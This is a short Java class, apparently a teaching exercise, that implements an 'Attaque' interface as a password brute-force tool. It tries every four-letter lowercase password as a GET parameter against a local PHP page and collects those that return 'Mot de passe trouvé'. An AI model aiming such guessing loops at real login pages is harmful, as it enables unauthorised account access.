import java.util.*;
import java.io.*;
import java.net.*;

public class Bruteforce implements Attaque {
    public Bruteforce() {
    }

    public ArrayList<String> CreerAttaque() {
        char[] alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        ArrayList<String> passwords = new ArrayList<String>();

        for (int i = 0; i < alphabet.length; i++) {
            for (int j = 0; j < alphabet.length; j++) {
                for (int k = 0; k < alphabet.length; k++) {
                    for (int l = 0; l < alphabet.length; l++) {
                        String combination = "" + alphabet[i] + alphabet[j] + alphabet[k] + alphabet[l];
                        passwords.add(combination);
                    }
                }
            }
        }

        ArrayList<String> validPasswords = new ArrayList<String>();
        for (String password : passwords) {
            try {
                URL url = new URL("http://localhost/dossier/User.php?password=" + password);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");

                try (BufferedReader in = new BufferedReader(
                        new InputStreamReader(connection.getInputStream()))) {
                    String line;
                    while ((line = in.readLine()) != null) {
                        System.out.println(line);
                        if (line.equals("Mot de passe trouvé")) {
                            validPasswords.add(password);
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        return validPasswords;
    }
}
